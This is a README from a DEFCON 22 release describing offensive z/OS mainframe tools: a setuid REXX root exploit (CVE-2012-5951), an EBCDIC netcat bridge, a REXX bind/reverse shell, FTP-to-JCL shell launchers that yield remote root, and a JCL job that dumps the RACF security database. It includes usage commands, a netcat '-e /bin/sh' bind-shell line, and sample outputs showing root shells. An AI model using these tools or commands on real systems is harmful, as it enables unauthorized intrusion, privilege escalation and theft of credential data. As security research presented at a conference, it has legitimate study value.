                 o
                  .
                  . +
                  |.
                 +.|
                  _:
                 /\_\
  .______________\/_/ _______________\_ __
  |             /_   _\              /\   `-> o Below is  the  description and
  |               /                  | .        story behind each of the files
  |  D E F C O N  2 2  R E A D M E   | _        included  in  this  CD.  Usage
  |                                  |(_)  _    examples and descriptions  are
  |    FiLES    : - 6 -              |  _ (_)   included as well as some back-
  |                                  | (_)      ground.
  |   AUTHOR    : Soldier of Fortran |
  |                                  |  .     o Files  are  also  available on
  | RELEASED    : o8 - o8 - 2o14     |          soldieroffortran.org
  |                                  |
. |                                  |        o Art  from   www.asciiarena.com
_\/_______________ __________________|                        /collys/designv5
  \               Y            .   _                             /designv5.txt
                  :             _ (_)
                  .            (_)    .
                  o          .     _
                  .               (_)

           L e t  '  s    G o

      _____________________________          ___________________
|----\                            ------------                 /-|
| oo1 \  " g e t r o o t . r x "                              /  |
|      \_______________________                    __________/   |
 -------                      ----------------------         ----
   ____________________________________________________________  :
  |                                                            |
  | //   _|_  GetRoot a REXX script for z/OS 1.1 (2001)     \\ |
  | /     |   through 1.13 (2014)                            \ |
  |                                                            |
  |  Provide a setuid REXX script and a program to execute     |
  |  and that program executes with a UID of that REXX script. |
  |                                                            |
  |  This script is a heavily modified and completed from the  |
  |  Logica Breach investigation which contained fragments of a|
  |  script called kuku.rx and is a PoC of CVE-2012-5951:      |
  :                                                            |
  :  Unspecified vulnerability in IBM Tivoli NetView 1.4, 5.1  :
  .  through 5.4, and 6.1 on z/OS allows local users to gain   .
     privileges by leveraging access to the normal Unix System
     Services (USS) security level.                            .

     What IBM doesn't want you to know is this works for ANY
     setuid REXX script. This hasn't been released and/or fixed
     (publicly) but don't worry, your mainframe is safe since
     IBM fixed this vulnerability a while ago. Which APAR? Which
     PTF? Who knows. The worst part, Tivoli netview doesn't even
     need to be installed for this to work so hopefully you
     installed all of IBMs PTFs.

     A remote version of this script using FTP and JCL is
     available in MainTP.

     Special Thanks
      - Oliver Lavery (GDS Security) for pointing me in the
        right direction wihout giving me the answer
      - Logica Breach Investigation file fup.pdf
      - Black Hat community for discovery (the Swedish one
        perhaps?)

     Usage:

        $ ./getroot.rx 'setuid rexx script' 'some exec'

     Example:

  .     $ ./getroot.rx '/usr/bin/cnmeunix' '/bin/sh'
        [+] DADE time to change your UID
  .     [+] Spawning /usr/bin/cnmeunix
  :     [+] File owner UID is: 0                               .
  :     [+] Getting new UID                                    :
  :     [+] new UID is: 0                                      :
  |     [+] Executing /bin/sh                                  |
  | \   # id -u                                              / |
  | \\  0                                                   // |
  |____________________________________________________________|


      _____________________________          ___________________
|----\                            ------------                 /-|
| oo2 \  " N e t E B C D I C a t "                            /  |
|      \_______________________                    __________/   |
 -------                      ----------------------         ----
   ____________________________________________________________  :
  |                                                            |
  | //   _|_  A simple Python script to connect an ASCII    \\ |
  | /     |   socket to a EBCDIC one.                        \ |
  |                                                            |
  | This script came out of a necessity. One of the first      |
  | things I did when hacking mainframes was try and compile   |
  | netcat. I was able to get it to work and it's available    |
  | on my Github. I was elated when I got it to run but no     |
  | matter what I did, netcat on linux wouldn't work. I would  |
  | always get gibberish. That's where NetEBCDICat comes in.   |
  : Using NetEBCDICat you're able to connect to EBCDIC sockets |
  : and have a two-way, legible communication between an ASCII :
  . and EBCDIC connection.                                     .
  .
    Usage                                                      .
      $ ./NetEBCDICat.py [ip] port

    Options

     -l, --listen listen for incomming connections
     -d, --d do not display cool ass logo

    Example
  .
  :     Assuming you opened a socket                           .
  :     (use nc -l -p 12345 -e /bin/sh on the mainframe)       :
  :                                                            :
  |     ./NetEBCDICat.py 192.168.10.10 12345 -d                |
  | \   uname -I                                             / |
  | \\  #  z/OS                                             // |
  |____________________________________________________________|


      _____________________________          ___________________
|----\                            ------------                 /-|
| oo3 \  " C A t S O "                                        /  |
|      \_______________________                    __________/   |
 -------                      ----------------------         ----
   ____________________________________________________________  :
  |                                                            |
  | //   _|_  A REXX script designed to act like an inter-  \\ |
  | /     |   preter allowing you to run TSO/UNIX commands   \ |
  |                                                            |
  | CaTSO is a "meterpreter" like shell written in REXX and is |
  | meant to run in TSO on IBM z/OS. It creates an ASCII       |
  | Listener on a supplied port or a reverse connection to an  |
  | IP and port. Connect to it with either metasploit or       |
  | netcat. Either upload the script and execute it in TSO or  |
  | use JCL and execute it that way. TShOcker automates the    |
  : latter.                                                    :
  :                                                            .
  . Usage
  .                                                            .
    There are two modes with this script:

    Listener Shell:

    EXEC CATSO 'L PORT'
    Reverse Shell:

    EXEC CATSO 'R IP PORT'
    Note: You may need to use a fully qualified dataset
    name. I.e. EXEC 'CASE.CATSO'.

    Example

      EXEC 'CASE.CATSO' 'L 31337'
      :+: Listening on port: 31337
      :!: IP 192.168.10.10 and Port 31337 opened
      :+: Server Ready
      Now connect with regular netcat

        $ nc 192.168.10.10 31337
      Enter command or 'help'> help
  .
  :    Core Commands
  :    =============                                           .
  :     Command           Description                          :
  |     -------           -----------                          :
  |     help              Help Menu                            |
  | \   exit              Terminate the session              / |
  | \\  quit              Terminate the session             // |
  |____________________________________________________________|

      _____________________________          ___________________
|----\                            ------------                 /-|
| oo4 \  " T S h O c k e r "                                  /  |
|      \_______________________                    __________/   |
 -------                      ----------------------         ----
   ____________________________________________________________  :
  |                                                            |
  | //   _|_  A python + JCL wrapper to use a mainframe     \\ |
  | /     |   FTP server to run rexx (in this case CATSO)    \ |
  |                                                            |
  | One day I was taking a shower when I remembered something  |
  | that I had read somewhere. The z/OS FTP server has a       |
  | special modification. Using the command SITE FILE=JES you  |
  | can submit JCL over FTP. JCL is the equivalent of a shell  |
  | script in the mainframe world. So if I rephrase: z/OS lets |
  | you upload and execute shell scripts! Yay! What does       |
  : TShOcker have to do with that? Well, TShOcker takes any    |
  : z/OS FTP server and, given a valid username and password,  :
  . turns that FTP server in to a JCL runnin machine. The JCL  .
  . it runs contains the CaTSO rexx script, which dumps in to
    a temp file and executes. Essentially, you tell TShOcker   .
    if you want a remote TSO bind 'shell' or a reverse 'shell'
    and it does the heaving lifting. And all it needs is an
    FTP server to do it.

    Usage

    TShOcker.py [-h] [-p PORT] [-r | -l] [--rport RPORT]
                     [--lhost LHOST] [--lport LPORT]
                     [--print] [--no-logo] [-v]
                     ip username password

    -r, --remote    Creates a TSO "shell" that listens on rport
                    (bind) shell
    -l, --listener  Connects back to a host:port (lhost:lport)
                    thats already waiting
    --rport RPORT   Remote port to open on the mainframe. If it
                    fails try > 1024
    --lhost LHOST   Listener is running and waiting on this IP
                    (probably your IP address)
    --lport LPORT   Listener running and waiting on this port
    --print         Just print the JCL to the screen
    --no-logo       Do not display the logo
    -v, --verbose   Verbose mode. More verbosity

    Example

        $ ./TShOcker.py -r --rport 31337 10.10.10.10 margo god

        [+] Connecting to: 10.10.0.210 : 21
  .     [+] Switching to JES mode
  :     [+] Inserting JCL with CATSO in to job queue           .
  :     [+] Done...                                            :
  :     To connect use nc 10.10.10.10 31337                    :
  |                                                            |
  | \   $ nc 10.10.0.210 31337                               / |
  | \\  Enter command or 'help'>                            // |
  |____________________________________________________________|

      _____________________________          ___________________
|----\                            ------------                 /-|
| oo5 \  " M a i n T P "                                      /  |
|      \_______________________                    __________/   |
 -------                      ----------------------         ----
   ____________________________________________________________  :
  |                                                            |
  | //   _|_  A python + JCL wrapper to use a mainframe     \\ |
  | /     |   FTP server to run compile and execute a root   \ |
  |           shell                                            |
  |                                                            |
  | This python script was slowly developed one weekend after  |
  | I realized what I had on my hands. Basically it went like  |
  | this: I know I can use FTP and can conduct a post auth     |
  | attack to execute JCL. I can use this JCL to execute rexx  |
  | script, but I can also get it to compile C code. I can get |
  : root with a simple rexx script and I can write a simple    :
  : bindshell C program. I also have NetEBCDICat to speak      .
  . EBCDIC. Once I put it all together I realized what I had:
  .                                                            .
    A way to get remote root on a mainframe with only FTP, a
    username and a password!

    Introducing the culmination of all those things: MainTP.
    MainTP combines all of the above in to one python script
    to try and pwn a mainframe. You supply the FTP server,
    username and password, and if it's vulnerable, you'll have
    a root shell. Even if you don't get root, you'll still
    get a shell!

    Usage

      $ ./MainTP.py [-r | -l] [--rport RPORT] [--lhost LHOST]
                    [--lport LPORT] [--print] [--no-logo] [-v]
                    ip username password
    Options

    -r, --remote   Creates a root shell that listens on rport
                   (bind) shell
    --rport RPORT  Remote port to connect with on the mainframe
                   If it fails try >1024
    -l, --listener Opens port on local machine and waits for
                   connection
    --lhost LHOST  Listener is on this IP (your IP address)
    --lport LPORT  Port to open which the shell will connect
    --print Just print the JCL to the screen
    --no-logo Do not display logo
    -v, --verbose Verbose mode. More verbosity

    Example
      $ ./MainTP.py -r --rport 31337 10.10.10.10 dade secret

        [+] Connecting to: 10.10.10.10 : 21
        [+] Switching to JES mode
        [+] Inserting JCL in to job queue
        [+] Job JOB00881 added to JES queue
  .     [+] Cleaning up...
  :     [+] Connecting Shell on port 31337 .....Done!          .
  :     Y0u n0w h4v3 r00t                                      :
  :     id -u                                                  :
  |     0                                                      |
  | \   uname -I                                             / |
  | \\  z/OS                                                // |
  |____________________________________________________________|

      _____________________________          ___________________
|----\                            ------------                 /-|
| oo6 \  " J C L - R A C F U N L D "                          /  |
|      \_______________________                    __________/   |
 -------                      ----------------------         ----
   ____________________________________________________________  :
  |                                                            |
  | //   _|_  A very simple JCL (Job Control Langyage to    \\ |
  | /     |   "unload" the RACF database to a flat file for  \ |
  |           detailed analysis                                |
  |                                                            |
  | JCL is the life blood on the mainframe. Most activities    |
  | are done using a job so its important that you know how    |
  | to use one. The RACF Unload JCL is a very simple script.   |
  | It uses a program (or PGM) called IRRDBU00 to create a     |
  | flat file version of the RACF database. This file comes    |
  : in very handy when doing audits or trying to figure out    |
  : who has operations and/or system special. Once this JCL    :
  . is done you can download the RACF.FLATFILE and do all      .
  . kinds of cool searches.
                                                               .
    Usage

    To use this JCL you need to first upload it, then you can
    submit it with:

    SUBMIT 'JADE.RACFUNLD'

    No Example, just read the JCL

    //RACFUNLD JOB  'RACFUNLD',
    //         NOTIFY=&SYSUID,
    //         CLASS=A,
    //         MSGCLASS=X,
    //         MSGLEVEL=(1,1),
    //         REGION=6000K,
    //         COND=(4,LT)
    //UNLOAD   EXEC PGM=IRRDBU00,PARM=NOLOCKINPUT
    //SYSPRINT DD SYSOUT=A,COPIES=1,DEST=U1018
    //****************************************************
    //* CHANGE SYS1.RACF.BACKUP TO YOUR RACF DB
    //* YOU CAN FIND THE RACF DB LOCATION BY TYPING
    //* 'RVARY' AT ANY TSO COMMAND PROMPT
    //* THE UNLOAD WILL BE STORED IN YOUR HLQ UNDER
    //* USERID.RACF.FLATFILE
    //****************************************************
    //INDD1    DD   DISP=SHR,DSN=SYS1.RACF.BACKUP
  . //OUTDD    DD   DSN=&SYSUID..RACF.FLATFILE,
  : //            DISP=(NEW,CATLG,DELETE),                     .
  : //            SPACE=(CYL,(70,10),RLSE),                    :
  : //            DCB=(RECFM=FB,LRECL=4096,BLKSIZE=0)          :
  |                                                            |
  | \                                                        / |
  | \\                                                      // |
  |______________________________________________________ _____|
